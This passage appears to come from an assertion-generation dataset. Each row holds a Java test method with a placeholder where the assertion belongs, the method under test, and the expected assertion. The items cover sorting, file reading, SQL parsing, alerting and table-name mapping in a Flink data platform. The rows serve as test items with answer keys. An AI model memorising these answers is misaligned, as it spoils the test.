-- 7 (2024-04-29 21:22:00) (测试目录2) -- 6 (2024-04-29 20:22:00) (生产任务) -- 1 (2024-04-28 19:22:00) (测试目录) -- 3 (2024-04-28 21:22:00) (aaa) -- 2 (2024-04-28 20:22:00) (bbb)  output: -- 4 (2024-04-29 19:22:00) (test) -- 7 (2024-04-29 21:22:00) (测试目录2) -- 6 (2024-04-29 20:22:00) (生产任务) -- 1 (2024-04-28 19:22:00) (测试目录) -- 3 (2024-04-28 21:22:00) (aaa) -- 2 (2024-04-28 20:22:00) (bbb) */ List<Catalogue> resultList = catalogueTreeSortFirstLetterStrategyTest.sort(catalogueTree, sortTypeEnum); List<Integer> resultIdList = CategoryTreeSortStrategyTestUtils.breadthTraverse(resultList); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug( ""sort catalogue tree based on first letter. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); Collator collator = Collator.getInstance(Locale.CHINA); return recursionSortCatalogues(catalogueTree, sortTypeEnum, collator); }"	assertEquals(Lists.newArrayList(4, 1, 7, 6, 3, 2), resultIdList)
"sortDescTest() { SortTypeEnum sortTypeEnum = SortTypeEnum.DESC; List<Catalogue> catalogueTree = Lists.newArrayList(); Catalogue catalogue = new Catalogue(); catalogue.setId(1); catalogue.setName(""测试目录""); catalogue.setCreateTime(LocalDateTime.of(2024, 4, 28, 19, 22, 0));  Catalogue catalogue11 = new Catalogue(); catalogue11.setId(2); catalogue11.setName(""bbb""); catalogue11.setCreateTime(LocalDateTime.of(2024, 4, 28, 20, 22, 0)); Catalogue catalogue12 = new Catalogue(); catalogue12.setId(3); catalogue12.setName(""aaa""); catalogue12.setCreateTime(LocalDateTime.of(2024, 4, 28, 21, 22, 0)); catalogue.setChildren(Lists.newArrayList(catalogue12, catalogue11));  Catalogue catalogue2 = new Catalogue(); catalogue2.setId(4); catalogue2.setName(""test""); catalogue2.setCreateTime(LocalDateTime.of(2024, 4, 29, 19, 22, 0));  Catalogue catalogue21 = new Catalogue(); catalogue21.setId(7); catalogue21.setName(""测试目录2""); catalogue21.setCreateTime(LocalDateTime.of(2024, 4, 29, 21, 22, 0)); Catalogue catalogue22 = new Catalogue(); catalogue22.setId(6); catalogue22.setName(""生产任务""); catalogue22.setCreateTime(LocalDateTime.of(2024, 4, 29, 20, 22, 0)); catalogue2.setChildren(Lists.newArrayList(catalogue21, catalogue22));  catalogueTree.add(catalogue2); catalogueTree.add(catalogue);  /* input: -- 4 (2024-04-29 19:22:00) (test) -- 7 (2024-04-29 21:22:00) (测试目录2) -- 6 (2024-04-29 20:22:00) (生产任务) -- 1 (2024-04-28 19:22:00) (测试目录) -- 3 (2024-04-28 21:22:00) (aaa) -- 2 (2024-04-28 20:22:00) (bbb)  output: -- 1 (2024-04-28 19:22:00) (测试目录) -- 2 (2024-04-28 20:22:00) (bbb) -- 3 (2024-04-28 21:22:00) (aaa) -- 4 (2024-04-29 19:22:00) (test) -- 6 (2024-04-29 20:22:00) (生产任务) -- 7 (2024-04-29 21:22:00) (测试目录2) */ List<Catalogue> resultList = catalogueTreeSortFirstLetterStrategyTest.sort(catalogueTree, sortTypeEnum); List<Integer> resultIdList = CategoryTreeSortStrategyTestUtils.breadthTraverse(resultList); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug( ""sort catalogue tree based on first letter. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); Collator collator = Collator.getInstance(Locale.CHINA); return recursionSortCatalogues(catalogueTree, sortTypeEnum, collator); }"	assertEquals(Lists.newArrayList(1, 4, 2, 3, 6, 7), resultIdList)
"sortEmptyTest() { List<Catalogue> catalogueTree = Lists.newArrayList(); SortTypeEnum sortTypeEnum = SortTypeEnum.ASC;  List<Catalogue> resultList = catalogueTreeSortFirstLetterStrategyTest.sort(catalogueTree, sortTypeEnum); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug( ""sort catalogue tree based on first letter. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); Collator collator = Collator.getInstance(Locale.CHINA); return recursionSortCatalogues(catalogueTree, sortTypeEnum, collator); }"	assertEquals(Lists.newArrayList(), resultList)
"sortEmptyTest2() { List<Catalogue> catalogueTree = null; SortTypeEnum sortTypeEnum = SortTypeEnum.ASC;  List<Catalogue> resultList = catalogueTreeSortFirstLetterStrategyTest.sort(catalogueTree, sortTypeEnum); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug( ""sort catalogue tree based on first letter. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); Collator collator = Collator.getInstance(Locale.CHINA); return recursionSortCatalogues(catalogueTree, sortTypeEnum, collator); }"	assertEquals(Lists.newArrayList(), resultList)
"testListDirByPath() { List<FileNode> dirList = DirUtil.listDirByPath(DirConstant.getRootLogsPath()); Assertions.""<AssertPlaceHolder>""; }
listDirByPath(String path) { List<FileNode> dirList = new ArrayList<>(); File logDir = new File(path); if (logDir.isFile()) { throw new BusException(StrUtil.format(""Directory path {} is a file."", path)); } File[] files = logDir.listFiles(); if (Asserts.isNull(files)) { throw new BusException(StrUtil.format(""Directory path {} does not exist."", path)); } for (File file : files) { FileNode fileNode = new FileNode(file.getName(), file.isDirectory(), 0, file.getAbsolutePath()); if (!fileNode.isDir()) { fileNode.setSize(file.length()); } dirList.add(fileNode); } return dirList; }"	assertThat(dirList).isNotNull()
"testReadFile() { String result = DirUtil.readFile(DirConstant.getRootLog()); Assertions.""<AssertPlaceHolder>""; }
readFile(String path) { StringBuilder builder = new StringBuilder(); File file = new File(path); if (!file.isFile()) { throw new BusException(StrUtil.format(""File path {} is not a file."", path)); } try (InputStreamReader inputStreamReader = new InputStreamReader(Files.newInputStream(file.toPath()), StandardCharsets.UTF_8); BufferedReader bufferedReader = new BufferedReader(inputStreamReader)) { String content; while ((content = bufferedReader.readLine()) != null) { builder.append(""\n""); builder.append(content); } } catch (Exception e) { e.printStackTrace(); } return builder.toString(); }"	assertThat(result).isNotNull()
"testReadRootLog() { String result = DirUtil.readFile(DirConstant.getRootLog()); Assertions.""<AssertPlaceHolder>""; }
readFile(String path) { StringBuilder builder = new StringBuilder(); File file = new File(path); if (!file.isFile()) { throw new BusException(StrUtil.format(""File path {} is not a file."", path)); } try (InputStreamReader inputStreamReader = new InputStreamReader(Files.newInputStream(file.toPath()), StandardCharsets.UTF_8); BufferedReader bufferedReader = new BufferedReader(inputStreamReader)) { String content; while ((content = bufferedReader.readLine()) != null) { builder.append(""\n""); builder.append(content); } } catch (Exception e) { e.printStackTrace(); } return builder.toString(); }"	assertThat(result).isNotNull()
"getStatements() { String sql = ""set 'state.savepoints.dir' = 'hdfs://namenode:9000/tmp/checkpoint'; --ddd\n"" + ""set 'state.checkpoints.dir' = 'hdfs://namenode:9000/tmp/checkpoint'; --dd \n"" + ""create table abc ;\n""; String[] statements = SqlUtil.getStatements(sql, "";\\s*(?:\\n|--.*)""); Assertions.""<AssertPlaceHolder>""; }
getStatements(String sql, String sqlSeparator) { if (Asserts.isNullString(sql)) { return new String[0]; }  final String localSqlSeparator = "";\\s*(?:\\n|--.*)""; String[] splits = sql.replace(""\r\n"", ""\n"").split(localSqlSeparator); String lastStatement = splits[splits.length - 1].trim(); if (lastStatement.endsWith(SEMICOLON)) { splits[splits.length - 1] = lastStatement.substring(0, lastStatement.length() - 1); }  return splits; }"	assertThat(statements.length).isEqualTo(3)
"GeneralSecurityException { AlertResult alertResult = emailSender.send(AlertBaseConstant.ALERT_TEMPLATE_TITLE, AlertBaseConstant.ALERT_TEMPLATE_MSG); Assert.""<AssertPlaceHolder>""; }
send(String title, String content) { AlertResult alertResult = new AlertResult(); // if there is no receivers && no receiversCc, no need to process if (CollectionUtils.isEmpty(emailParams.getReceivers())) { logger.error(""no receivers , you must set receivers""); return alertResult; }  try { String sendResult = MailUtil.send( getMailAccount(), emailParams.getReceivers(), emailParams.getReceiverCcs(), null, title, content, true); if (StringUtils.isNotBlank(sendResult)) { logger.info(""Send email info: {}"", sendResult); alertResult.setSuccess(true); alertResult.setMessage(sendResult); return alertResult; } } catch (GeneralSecurityException e) { handleException(alertResult, e); }  return alertResult; }"	assertEquals(true, alertResult.getSuccess())
"sendTest() { HttpAlert httpAlert = new HttpAlert(); AlertConfig alertConfig = new AlertConfig(); alertConfig.setType(HttpConstants.TYPE); alertConfig.setParam(httpConfig); httpAlert.setConfig(alertConfig); AlertResult alertResult = httpAlert.send(AlertBaseConstant.ALERT_TEMPLATE_TITLE, AlertBaseConstant.ALERT_TEMPLATE_MSG); Assert.""<AssertPlaceHolder>""; }
send(String title, String content) { AlertResult alertResult = new AlertResult();  if (httpParams.getMethod() == null) { alertResult.setSuccess(false); alertResult.setMessage(""Request types are not supported""); return alertResult; }  try { createHttpRequest(title, content); String resp = this.getResponseString(httpRequest); alertResult.setSuccess(true); alertResult.setMessage(resp); } catch (Exception e) { logger.error(""send http alert msg  failed"", e); alertResult.setSuccess(false); alertResult.setMessage(""send http request  alert fail.""); }  return alertResult; }"	assertEquals(true, alertResult.getSuccess())
"testGetSinkTableNameWithPrefixAndSuffix() { Map<String, String> sinkConfig = new HashMap<>(); sinkConfig.put(""table.prefix"", ""pre_""); sinkConfig.put(""table.suffix"", ""_suf""); sinkConfig.put(""table.lower"", ""false""); sinkConfig.put(""table.upper"", ""false""); when(config.getSink()).thenReturn(sinkConfig);  Table table = new Table(""testTable"", ""testSchema"", null); String expectedTableName = ""pre_testTable_suf""; Assert.""<AssertPlaceHolder>""; }
getSinkTableName(Table table) { String tableName = table.getName(); Map<String, String> sink = config.getSink();  // Add table name mapping logic String mappingRoute = sink.get(FlinkCDCConfig.TABLE_MAPPING_ROUTES); if (mappingRoute != null) { Map<String, String> mappingRules = parseMappingRoute(mappingRoute); if (mappingRules.containsKey(tableName)) { tableName = mappingRules.get(tableName); } }  tableName = sink.getOrDefault(FlinkCDCConfig.TABLE_PREFIX, """") + tableName + sink.getOrDefault(FlinkCDCConfig.TABLE_SUFFIX, """"); // table.lower and table.upper can not be true at the same time if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER)) && Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { throw new IllegalArgumentException(""table.lower and table.upper can not be true at the same time""); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { tableName = tableName.toUpperCase(); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER))) { tableName = tableName.toLowerCase(); } // Implement regular expressions to replace table names through // sink.table.replace.pattern and table.replace.with String replacePattern = sink.get(FlinkCDCConfig.TABLE_REPLACE_PATTERN); String replaceWith = sink.get(FlinkCDCConfig.TABLE_REPLACE_WITH); if (replacePattern != null && replaceWith != null) { Pattern pattern = Pattern.compile(replacePattern); Matcher matcher = pattern.matcher(tableName); tableName = matcher.replaceAll(replaceWith); }  // add schema if (Boolean.parseBoolean(sink.get(""table.prefix.schema""))) { tableName = table.getSchema() + ""_"" + tableName; }  return tableName; }"	assertEquals(expectedTableName, sinkBuilder.getSinkTableName(table))
"testGetSinkTableNameWithOnlyPrefix() { Map<String, String> sinkConfig = new HashMap<>(); sinkConfig.put(""table.prefix"", ""pre_""); sinkConfig.put(""table.suffix"", """"); sinkConfig.put(""table.lower"", ""false""); sinkConfig.put(""table.upper"", ""false""); when(config.getSink()).thenReturn(sinkConfig);  Table table = new Table(""testTable"", ""testSchema"", null); String expectedTableName = ""pre_testTable""; Assert.""<AssertPlaceHolder>""; }
getSinkTableName(Table table) { String tableName = table.getName(); Map<String, String> sink = config.getSink();  // Add table name mapping logic String mappingRoute = sink.get(FlinkCDCConfig.TABLE_MAPPING_ROUTES); if (mappingRoute != null) { Map<String, String> mappingRules = parseMappingRoute(mappingRoute); if (mappingRules.containsKey(tableName)) { tableName = mappingRules.get(tableName); } }  tableName = sink.getOrDefault(FlinkCDCConfig.TABLE_PREFIX, """") + tableName + sink.getOrDefault(FlinkCDCConfig.TABLE_SUFFIX, """"); // table.lower and table.upper can not be true at the same time if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER)) && Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { throw new IllegalArgumentException(""table.lower and table.upper can not be true at the same time""); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { tableName = tableName.toUpperCase(); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER))) { tableName = tableName.toLowerCase(); } // Implement regular expressions to replace table names through // sink.table.replace.pattern and table.replace.with String replacePattern = sink.get(FlinkCDCConfig.TABLE_REPLACE_PATTERN); String replaceWith = sink.get(FlinkCDCConfig.TABLE_REPLACE_WITH); if (replacePattern != null && replaceWith != null) { Pattern pattern = Pattern.compile(replacePattern); Matcher matcher = pattern.matcher(tableName); tableName = matcher.replaceAll(replaceWith); }  // add schema if (Boolean.parseBoolean(sink.get(""table.prefix.schema""))) { tableName = table.getSchema() + ""_"" + tableName; }  return tableName; }"	assertEquals(expectedTableName, sinkBuilder.getSinkTableName(table))
"testGetSinkTableNameWithOnlySuffix() { Map<String, String> sinkConfig = new HashMap<>(); sinkConfig.put(""table.prefix"", """"); sinkConfig.put(""table.suffix"", ""_suf""); sinkConfig.put(""table.lower"", ""false""); sinkConfig.put(""table.upper"", ""false""); when(config.getSink()).thenReturn(sinkConfig);  Table table = new Table(""testTable"", ""testSchema"", null); String expectedTableName = ""testTable_suf""; Assert.""<AssertPlaceHolder>""; }
getSinkTableName(Table table) { String tableName = table.getName(); Map<String, String> sink = config.getSink();  // Add table name mapping logic String mappingRoute = sink.get(FlinkCDCConfig.TABLE_MAPPING_ROUTES); if (mappingRoute != null) { Map<String, String> mappingRules = parseMappingRoute(mappingRoute); if (mappingRules.containsKey(tableName)) { tableName = mappingRules.get(tableName); } }  tableName = sink.getOrDefault(FlinkCDCConfig.TABLE_PREFIX, """") + tableName + sink.getOrDefault(FlinkCDCConfig.TABLE_SUFFIX, """"); // table.lower and table.upper can not be true at the same time if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER)) && Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { throw new IllegalArgumentException(""table.lower and table.upper can not be true at the same time""); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { tableName = tableName.toUpperCase(); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER))) { tableName = tableName.toLowerCase(); } // Implement regular expressions to replace table names through // sink.table.replace.pattern and table.replace.with String replacePattern = sink.get(FlinkCDCConfig.TABLE_REPLACE_PATTERN); String replaceWith = sink.get(FlinkCDCConfig.TABLE_REPLACE_WITH); if (replacePattern != null && replaceWith != null) { Pattern pattern = Pattern.compile(replacePattern); Matcher matcher = pattern.matcher(tableName); tableName = matcher.replaceAll(replaceWith); }  // add schema if (Boolean.parseBoolean(sink.get(""table.prefix.schema""))) { tableName = table.getSchema() + ""_"" + tableName; }  return tableName; }"	assertEquals(expectedTableName, sinkBuilder.getSinkTableName(table))
"testGetSinkTableNameWithSchemaPrefixEnabled() { Map<String, String> sinkConfig = new HashMap<>(); sinkConfig.put(""table.prefix.schema"", ""true""); sinkConfig.put(""table.prefix"", """"); sinkConfig.put(""table.suffix"", """"); sinkConfig.put(""table.lower"", ""false""); sinkConfig.put(""table.upper"", ""false""); when(config.getSink()).thenReturn(sinkConfig);  Table table = new Table(""testTable"", ""testSchema"", null); String expectedTableName = ""testSchema_testTable""; Assert.""<AssertPlaceHolder>""; }
getSinkTableName(Table table) { String tableName = table.getName(); Map<String, String> sink = config.getSink();  // Add table name mapping logic String mappingRoute = sink.get(FlinkCDCConfig.TABLE_MAPPING_ROUTES); if (mappingRoute != null) { Map<String, String> mappingRules = parseMappingRoute(mappingRoute); if (mappingRules.containsKey(tableName)) { tableName = mappingRules.get(tableName); } }  tableName = sink.getOrDefault(FlinkCDCConfig.TABLE_PREFIX, """") + tableName + sink.getOrDefault(FlinkCDCConfig.TABLE_SUFFIX, """"); // table.lower and table.upper can not be true at the same time if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER)) && Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { throw new IllegalArgumentException(""table.lower and table.upper can not be true at the same time""); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { tableName = tableName.toUpperCase(); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER))) { tableName = tableName.toLowerCase(); } // Implement regular expressions to replace table names through // sink.table.replace.pattern and table.replace.with String replacePattern = sink.get(FlinkCDCConfig.TABLE_REPLACE_PATTERN); String replaceWith = sink.get(FlinkCDCConfig.TABLE_REPLACE_WITH); if (replacePattern != null && replaceWith != null) { Pattern pattern = Pattern.compile(replacePattern); Matcher matcher = pattern.matcher(tableName); tableName = matcher.replaceAll(replaceWith); }  // add schema if (Boolean.parseBoolean(sink.get(""table.prefix.schema""))) { tableName = table.getSchema() + ""_"" + tableName; }  return tableName; }"	assertEquals(expectedTableName, sinkBuilder.getSinkTableName(table))
"testGetSinkTableNameWithConversionLowerCase() { Map<String, String> sinkConfig = new HashMap<>(); sinkConfig.put(""table.prefix"", """"); sinkConfig.put(""table.suffix"", """"); sinkConfig.put(""table.lower"", ""true""); sinkConfig.put(""table.upper"", ""false""); when(config.getSink()).thenReturn(sinkConfig);  Table table = new Table(""TestTable"", ""TestSchema"", null); String expectedTableName = ""testtable""; Assert.""<AssertPlaceHolder>""; }
getSinkTableName(Table table) { String tableName = table.getName(); Map<String, String> sink = config.getSink();  // Add table name mapping logic String mappingRoute = sink.get(FlinkCDCConfig.TABLE_MAPPING_ROUTES); if (mappingRoute != null) { Map<String, String> mappingRules = parseMappingRoute(mappingRoute); if (mappingRules.containsKey(tableName)) { tableName = mappingRules.get(tableName); } }  tableName = sink.getOrDefault(FlinkCDCConfig.TABLE_PREFIX, """") + tableName + sink.getOrDefault(FlinkCDCConfig.TABLE_SUFFIX, """"); // table.lower and table.upper can not be true at the same time if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER)) && Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { throw new IllegalArgumentException(""table.lower and table.upper can not be true at the same time""); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { tableName = tableName.toUpperCase(); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER))) { tableName = tableName.toLowerCase(); } // Implement regular expressions to replace table names through // sink.table.replace.pattern and table.replace.with String replacePattern = sink.get(FlinkCDCConfig.TABLE_REPLACE_PATTERN); String replaceWith = sink.get(FlinkCDCConfig.TABLE_REPLACE_WITH); if (replacePattern != null && replaceWith != null) { Pattern pattern = Pattern.compile(replacePattern); Matcher matcher = pattern.matcher(tableName); tableName = matcher.replaceAll(replaceWith); }  // add schema if (Boolean.parseBoolean(sink.get(""table.prefix.schema""))) { tableName = table.getSchema() + ""_"" + tableName; }  return tableName; }"	assertEquals(expectedTableName, sinkBuilder.getSinkTableName(table))
"testGetSinkTableNameWithConversionUpperCase() { Map<String, String> sinkConfig = new HashMap<>(); sinkConfig.put(""table.prefix"", """"); sinkConfig.put(""table.suffix"", """"); sinkConfig.put(""table.lower"", ""false""); sinkConfig.put(""table.upper"", ""true""); when(config.getSink()).thenReturn(sinkConfig);  Table table = new Table(""TestTable"", ""TestSchema"", null); String expectedTableName = ""TESTTABLE""; Assert.""<AssertPlaceHolder>""; }
getSinkTableName(Table table) { String tableName = table.getName(); Map<String, String> sink = config.getSink();  // Add table name mapping logic String mappingRoute = sink.get(FlinkCDCConfig.TABLE_MAPPING_ROUTES); if (mappingRoute != null) { Map<String, String> mappingRules = parseMappingRoute(mappingRoute); if (mappingRules.containsKey(tableName)) { tableName = mappingRules.get(tableName); } }  tableName = sink.getOrDefault(FlinkCDCConfig.TABLE_PREFIX, """") + tableName + sink.getOrDefault(FlinkCDCConfig.TABLE_SUFFIX, """"); // table.lower and table.upper can not be true at the same time if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER)) && Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { throw new IllegalArgumentException(""table.lower and table.upper can not be true at the same time""); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { tableName = tableName.toUpperCase(); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER))) { tableName = tableName.toLowerCase(); } // Implement regular expressions to replace table names through // sink.table.replace.pattern and table.replace.with String replacePattern = sink.get(FlinkCDCConfig.TABLE_REPLACE_PATTERN); String replaceWith = sink.get(FlinkCDCConfig.TABLE_REPLACE_WITH); if (replacePattern != null && replaceWith != null) { Pattern pattern = Pattern.compile(replacePattern); Matcher matcher = pattern.matcher(tableName); tableName = matcher.replaceAll(replaceWith); }  // add schema if (Boolean.parseBoolean(sink.get(""table.prefix.schema""))) { tableName = table.getSchema() + ""_"" + tableName; }  return tableName; }"	assertEquals(expectedTableName, sinkBuilder.getSinkTableName(table))
"testGetSinkTableNameWithNoConfigPrefixOrSuffix() { Map<String, String> sinkConfig = new HashMap<>(); sinkConfig.put(""table.prefix"", """"); sinkConfig.put(""table.suffix"", """"); sinkConfig.put(""table.lower"", ""false""); sinkConfig.put(""table.upper"", ""false""); when(config.getSink()).thenReturn(sinkConfig);  Table table = new Table(""testTable"", ""testSchema"", null); String expectedTableName = ""testTable""; Assert.""<AssertPlaceHolder>""; }
getSinkTableName(Table table) { String tableName = table.getName(); Map<String, String> sink = config.getSink();  // Add table name mapping logic String mappingRoute = sink.get(FlinkCDCConfig.TABLE_MAPPING_ROUTES); if (mappingRoute != null) { Map<String, String> mappingRules = parseMappingRoute(mappingRoute); if (mappingRules.containsKey(tableName)) { tableName = mappingRules.get(tableName); } }  tableName = sink.getOrDefault(FlinkCDCConfig.TABLE_PREFIX, """") + tableName + sink.getOrDefault(FlinkCDCConfig.TABLE_SUFFIX, """"); // table.lower and table.upper can not be true at the same time if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER)) && Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { throw new IllegalArgumentException(""table.lower and table.upper can not be true at the same time""); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { tableName = tableName.toUpperCase(); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER))) { tableName = tableName.toLowerCase(); } // Implement regular expressions to replace table names through // sink.table.replace.pattern and table.replace.with String replacePattern = sink.get(FlinkCDCConfig.TABLE_REPLACE_PATTERN); String replaceWith = sink.get(FlinkCDCConfig.TABLE_REPLACE_WITH); if (replacePattern != null && replaceWith != null) { Pattern pattern = Pattern.compile(replacePattern); Matcher matcher = pattern.matcher(tableName); tableName = matcher.replaceAll(replaceWith); }  // add schema if (Boolean.parseBoolean(sink.get(""table.prefix.schema""))) { tableName = table.getSchema() + ""_"" + tableName; }  return tableName; }"	assertEquals(expectedTableName, sinkBuilder.getSinkTableName(table))
"testGetSinkTableNameWithReplace() { Map<String, String> sinkConfig = new HashMap<>(); sinkConfig.put(""table.replace.pattern"", ""t_(.*?)_""); sinkConfig.put(""table.replace.with"", ""ods_$1_""); sinkConfig.put(""table.lower"", ""false""); sinkConfig.put(""table.upper"", ""false""); when(config.getSink()).thenReturn(sinkConfig);  Table table = new Table(""t_example_test"", ""testSchema"", null); String expectedTableName = ""ods_example_test""; Assert.""<AssertPlaceHolder>""; }
getSinkTableName(Table table) { String tableName = table.getName(); Map<String, String> sink = config.getSink();  // Add table name mapping logic String mappingRoute = sink.get(FlinkCDCConfig.TABLE_MAPPING_ROUTES); if (mappingRoute != null) { Map<String, String> mappingRules = parseMappingRoute(mappingRoute); if (mappingRules.containsKey(tableName)) { tableName = mappingRules.get(tableName); } }  tableName = sink.getOrDefault(FlinkCDCConfig.TABLE_PREFIX, """") + tableName + sink.getOrDefault(FlinkCDCConfig.TABLE_SUFFIX, """"); // table.lower and table.upper can not be true at the same time if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER)) && Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { throw new IllegalArgumentException(""table.lower and table.upper can not be true at the same time""); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { tableName = tableName.toUpperCase(); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER))) { tableName = tableName.toLowerCase(); } // Implement regular expressions to replace table names through // sink.table.replace.pattern and table.replace.with String replacePattern = sink.get(FlinkCDCConfig.TABLE_REPLACE_PATTERN); String replaceWith = sink.get(FlinkCDCConfig.TABLE_REPLACE_WITH); if (replacePattern != null && replaceWith != null) { Pattern pattern = Pattern.compile(replacePattern); Matcher matcher = pattern.matcher(tableName); tableName = matcher.replaceAll(replaceWith); }  // add schema if (Boolean.parseBoolean(sink.get(""table.prefix.schema""))) { tableName = table.getSchema() + ""_"" + tableName; }  return tableName; }"	assertEquals(expectedTableName, sinkBuilder.getSinkTableName(table))
"toTruncateJsonTest() { SelectResult selectResult = prepareData(); String truncateJson = selectResult.toTruncateJson(10L); log.info(""truncateJson: {}"", truncateJson); ""<AssertPlaceHolder>""; }
toTruncateJson(Long length) { String jsonStr = JSONUtil.toJsonStr(this); long overLength = jsonStr.length() - length; if (overLength <= 0) { return jsonStr; } this.truncationFlag = true; if (CollectionUtil.isEmpty(rowData)) { this.columns = Sets.newLinkedHashSet(); String finalJsonStr = JSONUtil.toJsonStr(this); if (finalJsonStr.length() > length) { log.warn( ""The row data and columns is empty, but still exceeds the length limit. "" + ""Json: {}, length: {}"", finalJsonStr, length); return ""{}""; } return finalJsonStr; } // Estimate the size of each row of data to determine how many rows should be removed. String lineJsonStr = JSONUtil.toJsonStr(rowData.get(rowData.size() - 1)); int lineLength = lineJsonStr.length(); int removeLine = getRemoveLine(overLength, lineLength, rowData.size()); rowData = ListUtil.sub(rowData, 0, rowData.size() - removeLine); return toTruncateJson(length); }"	"assertEquals(""{}"", truncateJson)"
"toTruncateJsonTest2() { SelectResult selectResult = prepareData(); String truncateJson = selectResult.toTruncateJson(200L); log.info(""truncateJson: {}"", truncateJson); selectResult.setRowData(Lists.newArrayList()); ""<AssertPlaceHolder>""; }
toTruncateJson(Long length) { String jsonStr = JSONUtil.toJsonStr(this); long overLength = jsonStr.length() - length; if (overLength <= 0) { return jsonStr; } this.truncationFlag = true; if (CollectionUtil.isEmpty(rowData)) { this.columns = Sets.newLinkedHashSet(); String finalJsonStr = JSONUtil.toJsonStr(this); if (finalJsonStr.length() > length) { log.warn( ""The row data and columns is empty, but still exceeds the length limit. "" + ""Json: {}, length: {}"", finalJsonStr, length); return ""{}""; } return finalJsonStr; } // Estimate the size of each row of data to determine how many rows should be removed. String lineJsonStr = JSONUtil.toJsonStr(rowData.get(rowData.size() - 1)); int lineLength = lineJsonStr.length(); int removeLine = getRemoveLine(overLength, lineLength, rowData.size()); rowData = ListUtil.sub(rowData, 0, rowData.size() - removeLine); return toTruncateJson(length); }"	assertEquals(JSONUtil.toJsonStr(selectResult), truncateJson)
"toTruncateJsonTest3() { SelectResult selectResult = prepareData(); String truncateJson = selectResult.toTruncateJson(250L); log.info(""truncateJson: {}"", truncateJson); selectResult.setRowData(Lists.newArrayList(selectResult.getRowData().get(0))); ""<AssertPlaceHolder>""; }
toTruncateJson(Long length) { String jsonStr = JSONUtil.toJsonStr(this); long overLength = jsonStr.length() - length; if (overLength <= 0) { return jsonStr; } this.truncationFlag = true; if (CollectionUtil.isEmpty(rowData)) { this.columns = Sets.newLinkedHashSet(); String finalJsonStr = JSONUtil.toJsonStr(this); if (finalJsonStr.length() > length) { log.warn( ""The row data and columns is empty, but still exceeds the length limit. "" + ""Json: {}, length: {}"", finalJsonStr, length); return ""{}""; } return finalJsonStr; } // Estimate the size of each row of data to determine how many rows should be removed. String lineJsonStr = JSONUtil.toJsonStr(rowData.get(rowData.size() - 1)); int lineLength = lineJsonStr.length(); int removeLine = getRemoveLine(overLength, lineLength, rowData.size()); rowData = ListUtil.sub(rowData, 0, rowData.size() - removeLine); return toTruncateJson(length); }"	assertEquals(JSONUtil.toJsonStr(selectResult), truncateJson)
"replaceFragmentTest() { String statement = ""nullif1:=NULLIF(1, 0) as val;\n"" + ""nullif2:=NULLIF(0, 0) as val$null;\n"" + ""select ${nullif1},${nullif2}""; String pretreatStatement = FlinkInterceptor.pretreatStatement(ExecutorFactory.getDefaultExecutor(), statement); Assert.""<AssertPlaceHolder>""; }
pretreatStatement(Executor executor, String statement) { statement = SqlUtil.removeNote(statement); if (executor.isUseSqlFragment()) { statement = executor.getVariableManager().parseVariable(statement); } return statement.trim(); }"	"assertEquals(""select NULLIF(1, 0) as val,NULLIF(0, 0) as val$null"", pretreatStatement)"
"ofTest() { String dataType = ""Decimal(6)""; ClickHouseDataTypeEnum res = of(dataType); ""<AssertPlaceHolder>""; }
